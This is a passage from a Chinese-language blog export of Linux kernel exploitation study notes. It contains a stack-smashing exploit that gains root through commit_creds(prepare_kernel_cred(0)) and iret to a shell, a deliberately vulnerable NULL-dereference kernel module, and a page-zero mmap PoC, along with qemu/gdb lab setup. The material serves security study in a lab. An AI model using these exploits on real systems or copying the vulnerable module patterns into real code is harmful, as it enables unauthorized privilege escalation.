stack_smashing_poc.c</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">24</span>];</span><br><span class="line">        <span class="built_in">memset</span>(buf,<span class="string">&#x27;A&#x27;</span>,<span class="number">24</span>);</span><br><span class="line">        *((<span class="keyword">void</span>**) (buf+<span class="number">20</span>)) = <span class="number">0x43434343</span>;</span><br><span class="line">        <span class="comment">//write(1,buf,sizeof(buf));</span></span><br><span class="line">        <span class="keyword">int</span> fd = open(<span class="string">&quot;/proc/bug2&quot;</span>, O_WRONLY);</span><br><span class="line">        write(fd, buf, <span class="keyword">sizeof</span>(buf));</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><blockquote><p>从内核模式赋予root权限commit_creds(prepare_kernel_cred(0))然后直接返回用户模式，并在用户模式启一个shell，拿到root shell，其中使用iret指令来返回。</p></blockquote><h3 id="iret简介"><a href="#iret简介" class="headerlink" title="iret简介"></a>iret简介</h3><blockquote></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">当使用IRET指令返回到相同保护级别的任务时，IRET会从堆栈弹出代码段选择子及指令指针分别到CS与IP寄存器，并弹出标志寄存器内容到EFLAGS寄存器。</span><br><span class="line"></span><br><span class="line">当使用IRET指令返回到一个不同的保护级别时，IRET不仅会从堆栈弹出以上内容，还会弹出堆栈段选择子及堆栈指针分别到SS与SP寄存器。</span><br></pre></td></tr></table></figure><h3 id="硬件在栈上保存了trap-frame，iret从下面的结构中恢复到用户模式"><a href="#硬件在栈上保存了trap-frame，iret从下面的结构中恢复到用户模式" class="headerlink" title="硬件在栈上保存了trap frame，iret从下面的结构中恢复到用户模式"></a>硬件在栈上保存了trap frame，iret从下面的结构中恢复到用户模式</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">trap_frame</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">void</span>* eip;<span class="comment">// instruction pointer +0</span></span><br><span class="line"><span class="keyword">uint32_t</span> cs;<span class="comment">// code segment    +4</span></span><br><span class="line"><span class="keyword">uint32_t</span> eflags;<span class="comment">// CPU flags       +8</span></span><br><span class="line"><span class="keyword">void</span>* esp;<span class="comment">// stack pointer       +12</span></span><br><span class="line"><span class="keyword">uint32_t</span> ss;<span class="comment">// stack segment   +16</span></span><br><span class="line">&#125; __attribute__((packed));</span><br></pre></td></tr></table></figure><h3 id="构造fake-trap-frame和用户模式shell"><a href="#构造fake-trap-frame和用户模式shell" class="headerlink" title="构造fake trap frame和用户模式shell"></a>构造fake trap frame和用户模式shell</h3><h4 id="构造fake-trap-frame-struct-trap-frame"><a href="#构造fake-trap-frame-struct-trap-frame" class="headerlink" title="构造fake trap frame(struct trap_frame)"></a>构造fake trap frame(struct trap_frame)</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">prepare_tf</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">asm</span>(<span class="string">&quot;pushl %cs; popl tf+4;&quot;</span><span class="comment">//填充tf.cs为当前的cs</span></span><br><span class="line"><span class="string">&quot;pushfl; popl tf+8;&quot;</span><span class="comment">//填充tf.eflags为当前的eflags</span></span><br><span class="line"><span class="string">&quot;pushl %esp; popl tf+12;&quot;</span><span class="comment">//填充tf.esp为当前的esp</span></span><br><span class="line"><span class="string">&quot;pushl %ss; popl tf+16;&quot;</span>);<span class="comment">//填充tf.ss为当前的ss</span></span><br><span class="line">tf.eip = &amp;launch_shell;<span class="comment">//填充tf.eip为launch_shell</span></span><br><span class="line">tf.esp -= <span class="number">1024</span>;<span class="comment">//unused part of stack</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="用户模式shell"><a href="#用户模式shell" class="headerlink" title="用户模式shell"></a>用户模式shell</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">launch_shell</span><span class="params">(<span class="keyword">void</span>)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">execl(<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;sh&quot;</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="最终的exp和调试"><a href="#最终的exp和调试" class="headerlink" title="最终的exp和调试"></a>最终的exp和调试</h3><blockquote><p>注意添加断点直接b bug2_write,通过commit_creds(prepare_kernel_cred(0))赋予root权限<br>并通过iret从内核态直接返回用户态然后启动用户态的shell(launch_shell)此时得到的就是root shell</p></blockquote><h5 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">trap_frame</span>&#123;</span></span><br><span class="line">    <span class="keyword">void</span> *eip;</span><br><span class="line">    <span class="keyword">uint32_t</span> cs;</span><br><span class="line">    <span class="keyword">uint32_t</span> eflags;</span><br><span class="line">    <span class="keyword">void</span> *esp;</span><br><span class="line">    <span class="keyword">uint32_t</span> ss;</span><br><span class="line">&#125;__attribute__((packed));</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">trap_frame</span> <span class="title">tf</span>;</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_shell</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    execl(<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;sh&quot;</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init_tf_work</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">&quot;pushl %cs;popl tf+4;&quot;</span> <span class="comment">//set cs</span></span><br><span class="line">        <span class="string">&quot;pushfl;popl tf+8;&quot;</span>  <span class="comment">//set eflags</span></span><br><span class="line">        <span class="string">&quot;pushl %esp;popl tf+12;&quot;</span></span><br><span class="line">        <span class="string">&quot;pushl %ss;popl tf+16;&quot;</span>);</span><br><span class="line">    tf.eip = &amp;get_shell;</span><br><span class="line">    tf.esp -= <span class="number">1024</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KERNCALL __attribute__((regparm(3)))</span></span><br><span class="line"><span class="keyword">void</span>* (*prepare_kernel_cred)(<span class="keyword">void</span>*) KERNCALL = (<span class="keyword">void</span>*) <span class="number">0xc1067c30</span>;</span><br><span class="line"><span class="keyword">void</span> (*commit_creds)(<span class="keyword">void</span>*) KERNCALL = (<span class="keyword">void</span>*) <span class="number">0xc1067a90</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">payload</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="comment">//payload here    </span></span><br><span class="line">    commit_creds(prepare_kernel_cred(<span class="number">0</span>));</span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">&quot;mov $tf,%esp;&quot;</span></span><br><span class="line">       <span class="string">&quot;iret;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">24</span>];</span><br><span class="line">    <span class="built_in">memset</span>(buf,<span class="number">0x41</span>,<span class="number">24</span>);</span><br><span class="line">    *((<span class="keyword">void</span>**)(buf+<span class="number">20</span>)) = &amp;payload; <span class="comment">//set eip to payload</span></span><br><span class="line">    init_tf_work();</span><br><span class="line">    write(<span class="number">1</span>,buf,<span class="keyword">sizeof</span>(buf));</span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">&quot;/proc/bug2&quot;</span>,O_WRONLY);</span><br><span class="line">    <span class="comment">//exploit</span></span><br><span class="line">    write(fd,buf,<span class="keyword">sizeof</span>(buf));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h6 id="3-调试exploit"><a href="#3-调试exploit" class="headerlink" title="3. 调试exploit"></a>3. 调试exploit</h6><p>先要做一些准备工作：</p><ul><li>确定模块代码节地址</li></ul><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/kerenl-exploig2-08.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/kerenl-exploig2-08.png"></a></p><ul><li>gdb设置</li></ul><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/kerenl-exploit2-09.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/kerenl-exploit2-09.png"></a><br>然后就可以返回到系统中，运行exploit程序了。</p><p>对ret指令下断，然后c过去，这时候单步的话，应该就ret到我们payload的地址了。</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/kerenl-exploioit2-10.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/kerenl-exploioit2-10.png"></a><br>查看一下栈顶的情况：</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/kerenl-exploioit2-11.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/kerenl-exploioit2-11.png"></a></p><p>接下来，我们单步，直行进入我们的payload。</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/kernel-exploit2-12.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/kernel-exploit2-12.png"></a></p><p>这里可以看到先去执行<code>commit_creds(prepare_kernel_cred(0))</code>了。</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/kernel-exploit2-13.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/kernel-exploit2-13.png"></a></p><p><a href="/Users/swing/Desktop/kerel-exploit2-14.png" class="gallery-item"><img src="/Users/swing/Desktop/kerel-exploit2-14.png"></a></p><p>我们主要关注iret的时候：</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/kernel-exploit2-15.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/kernel-exploit2-15.png"></a></p><p>红色部分就是我们伪造的tf结构啦！</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/kernel-exploit2-16.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/kernel-exploit2-16.png"></a><br><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/kernel-exploit2-17.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/kernel-exploit2-17.png"></a></p><p>这边可以看到eip指向是我们用来起shell的函数，这样看来整个payload结构是没什么问题的。</p><h2 id="最终效果"><a href="#最终效果" class="headerlink" title="最终效果"></a>最终效果</h2><blockquote><p>按write-linux-kernel-exploit-1文中——qemu中添加普通用户并测试<br><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/kernel-exploit2-18.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/kernel-exploit2-18.png"></a></p></blockquote><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><blockquote><p>真实环境中，canary是启用的，一旦canary被覆盖，就会造成kernel panics</p></blockquote><h3 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h3><p><a href="https://tc.gtisc.gatech.edu/bss/2014/r/kernel-exploits.pdf">linux_kernel_exploit</a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> 漏洞分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> Linux-kernel </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux-kernel expoit  study (3)---NULL dereference</title>
      <link href="write-kernel-exploits-1.html"/>
      <url>write-kernel-exploits-1.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h1 id="write-linux-kernel-exploit-1"><a href="#write-linux-kernel-exploit-1" class="headerlink" title="write linux kernel exploit 1"></a>write linux kernel exploit 1</h1><h2 id="前言-重新配置一下-busybox"><a href="#前言-重新配置一下-busybox" class="headerlink" title="前言  -重新配置一下 busybox"></a>前言  -重新配置一下 busybox</h2><p>之前的busybox 废了，发现出现了意料之外，情理之中的问题。还是太浮躁了，没仔细看参考链接。<br>重新配置一下 busybox</p><h3 id="step-1"><a href="#step-1" class="headerlink" title="step 1"></a>step 1</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd _install</span><br></pre></td></tr></table></figure><h3 id="step-2-创建对应的目录"><a href="#step-2-创建对应的目录" class="headerlink" title="step 2 创建对应的目录"></a>step 2 创建对应的目录</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$ mkdir proc sys dev etc etc&#x2F;init.d</span><br><span class="line">$ cd etc&#x2F;init.d</span><br><span class="line">$ vim rcS</span><br><span class="line">$ cat rcS</span><br><span class="line">#!&#x2F;bin&#x2F;sh</span><br><span class="line">#!&#x2F;bin&#x2F;sh</span><br><span class="line">mount -t proc none &#x2F;proc</span><br><span class="line">mount -t sys none &#x2F;sys</span><br><span class="line">&#x2F;bin&#x2F;mount -n -t sysfs none &#x2F;sys</span><br><span class="line">&#x2F;bin&#x2F;mount -t ramfs none &#x2F;dev</span><br><span class="line">&#x2F;sbin&#x2F;mdev -s</span><br><span class="line">$ chmod +x rcS</span><br><span class="line">$ find . | cpio -o --format&#x3D;newc &gt; rootfs.img</span><br><span class="line">$ gzip -c rootfs.img &gt; rootfs.img.gz</span><br><span class="line">$ cp rootfs.img.gz ..&#x2F;..&#x2F;linux-2.6.32.1</span><br></pre></td></tr></table></figure><h3 id="解决can’t-not-open-dev-tty2"><a href="#解决can’t-not-open-dev-tty2" class="headerlink" title="解决can’t not open /dev/tty2"></a>解决can’t not open /dev/tty2</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$ cd _install</span><br><span class="line">$ ln -sf null tty2</span><br><span class="line">$ ln -sf null tty3</span><br><span class="line">$ ln -sf null tty4</span><br><span class="line"></span><br><span class="line">$ vim etc&#x2F;init.d&#x2F;fstab</span><br><span class="line">proc  &#x2F;proc      proc    defaults     0      0</span><br><span class="line">proc  &#x2F;proc      proc    defaults     0      0</span><br><span class="line">$  chmod 644 fstab</span><br><span class="line"></span><br><span class="line">$ vim etc&#x2F;init.d&#x2F;inittab</span><br><span class="line">::sysinit:&#x2F;etc&#x2F;init.d&#x2F;rcS</span><br><span class="line">::askfirst:&#x2F;bin&#x2F;sh</span><br><span class="line">$ chmod 644 inittab</span><br></pre></td></tr></table></figure><h3 id="qume-启用busybox"><a href="#qume-启用busybox" class="headerlink" title="qume 启用busybox"></a>qume 启用busybox</h3><p><code>cd /tmp</code><br>创建一个ext2文件系统镜像用于把joker_test_syscall_lib和对应的busybox打包，其大小应该能容纳整个busybox/_install</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ dd if&#x3D;&#x2F;dev&#x2F;zero of&#x3D;my.img bs&#x3D;30M count&#x3D;2</span><br><span class="line">$ mkfs.ext2 -N 512 my.img</span><br></pre></td></tr></table></figure><p>挂在镜像，并把busybx/_install下的内容拷贝过去</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sudo mount -t ext2 my.img &#x2F;mnt</span><br><span class="line">$ sudo cp -fr _install&#x2F;* &#x2F;mnt</span><br></pre></td></tr></table></figure><p>卸载镜像<br><code>$ sudo umount /mnt</code></p><p><code> qemu-system-i386 -kernel arch/i386/boot/bzImage -hda /tmp/my.img -append &quot;root=/dev/sda&quot;</code></p><h2 id="NULL-dereference"><a href="#NULL-dereference" class="headerlink" title="NULL dereference"></a>NULL dereference</h2><blockquote><p>古老的Linux NULL pointer dereference exploit,映射0地址分配shellcode运行</p></blockquote><h3 id="一个简单的demo"><a href="#一个简单的demo" class="headerlink" title="一个简单的demo"></a>一个简单的demo</h3><blockquote><p>漏洞很明显，my_funptr指针是空，在调用虚拟文件系统write_proc时候出现null dereference</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">$ vim null_dereference.c</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/proc_fs.h&gt;</span></span></span><br><span class="line"><span class="keyword">void</span> (*my_funptr)(<span class="keyword">void</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bug1_write</span><span class="params">(struct file *file,<span class="keyword">const</span> <span class="keyword">char</span> *buf,<span class="keyword">unsigned</span> <span class="keyword">long</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">my_funptr();</span><br><span class="line"><span class="keyword">return</span> len;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> __init <span class="title">null_dereference_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">printk(KERN_ALERT <span class="string">&quot;null_dereference driver init!\n&quot;</span>);</span><br><span class="line">create_proc_entry(<span class="string">&quot;bug1&quot;</span>,<span class="number">0666</span>,<span class="number">0</span>)-&gt;write_proc = bug1_write;</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> __exit <span class="title">null_dereference_exit</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">printk(KERN_ALERT <span class="string">&quot;null_dereference driver exit\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(null_dereference_init);</span><br><span class="line">module_exit(null_dereference_exit);</span><br></pre></td></tr></table></figure><h3 id="简单的测试"><a href="#简单的测试" class="headerlink" title="简单的测试"></a>简单的测试</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">qemu启动内核，加载相关的busybox</span><br><span class="line">$ qemu-system-i386 -kernel arch/i386/boot/bzImage -hda /tmp/my.img -append <span class="string">&quot;root=/dev/sda&quot;</span> </span><br><span class="line"></span><br><span class="line">加载模块</span><br><span class="line">$ insmod null_dereference.ko</span><br></pre></td></tr></table></figure><p><a href="http://i2.muimg.com/567571/c5e276ea405d452f.jpg" class="gallery-item"><img src="http://i2.muimg.com/567571/c5e276ea405d452f.jpg"></a></p><h2 id="在qemu中运行并测试"><a href="#在qemu中运行并测试" class="headerlink" title="在qemu中运行并测试"></a>在qemu中运行并测试</h2><blockquote><p>在本机编译相应的ko、poc和exp，并把ko、poc和exp添加到busybox镜像中，然后gdb与qemu结合调试，其中poc和exp需要静态编译。<a href="add-a-system-call">方法见–在qemu中测试</a><br><strong>ko文件的Makefile, KERNELDR目录设置为linux内核源码的根目录即可</strong></p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">obj-m := null_dereference.o  </span><br><span class="line">KERNELDR := ~/linux_kernel/linux<span class="number">-2.6</span><span class="number">.32</span><span class="number">.1</span>  </span><br><span class="line">PWD := $(shell pwd)  </span><br><span class="line">modules:  </span><br><span class="line">$(MAKE) -C $(KERNELDR) M=$(PWD) modules  </span><br><span class="line">moduels_install:  </span><br><span class="line">$(MAKE) -C $(KERNELDR) M=$(PWD) modules_install  </span><br><span class="line">clean:  </span><br><span class="line">rm -rf *.o *~ core .depend .*.cmd *.ko *.mod.c .tmp_versions </span><br></pre></td></tr></table></figure><h3 id="poc测试"><a href="#poc测试" class="headerlink" title="poc测试"></a>poc测试</h3><blockquote><p>poc</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">$ vim null_dereference_exp.c</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="keyword">char</span> payload[] = <span class="string">&quot;\xe9\xea\xbe\xad\x0b&quot;</span>;<span class="comment">//jmp 0xbadbeef</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">mmap(<span class="number">0</span>, <span class="number">4096</span>,PROT_READ | PROT_WRITE | PROT_EXEC, MAP_FIXED | MAP_PRIVATE | MAP_ANONYMOUS ,<span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line"><span class="built_in">memcpy</span>(<span class="number">0</span>, payload, <span class="keyword">sizeof</span>(payload));</span><br><span class="line"><span class="keyword">int</span> fd = open(<span class="string">&quot;/proc/bug1&quot;</span>, O_WRONLY);</span><br><span class="line">write(fd, <span class="string">&quot;0x9k&quot;</span>, <span class="number">4</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> &#125;</span><br><span class="line">$ gcc -<span class="keyword">static</span> -o null_dereference_exp null_dereference_exp.c</span><br></pre></td></tr></table></figure><blockquote><p>qemu调试在0地址处下断点</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">以调试模式启动qemu</span><br><span class="line">$ qemu-system-i386 -S -kernel arch/i386/boot/bzImage -hda /tmp/my.img -append <span class="string">&quot;root=/dev/sda&quot;</span></span><br><span class="line"></span><br><span class="line">在qemu中按住Ctrl＋Alt＋2</span><br><span class="line">$ gdbserver tcp::1234</span><br></pre></td></tr></table></figure><p><a href="http://i1.piimg.com/567571/697a6d600f0a6455.jpg" class="gallery-item"><img src="http://i1.piimg.com/567571/697a6d600f0a6455.jpg"></a><br>linux 内核目录下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">在主机中启动gdb,并链接qemu并设置断点</span><br><span class="line">$ gdb vmlinux</span><br><span class="line">gdb-peda$ target remote localhost:1234</span><br><span class="line">gdb-peda$ b *0x0</span><br><span class="line">gdb-peda$ c</span><br><span class="line"></span><br><span class="line">在qemu中按住Ctrl+Alt+1切换到运行状态</span><br></pre></td></tr></table></figure><p><a href="http://i4.buimg.com/567571/bf793c7cb4edb01b.png" class="gallery-item"><img src="http://i4.buimg.com/567571/bf793c7cb4edb01b.png"></a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td 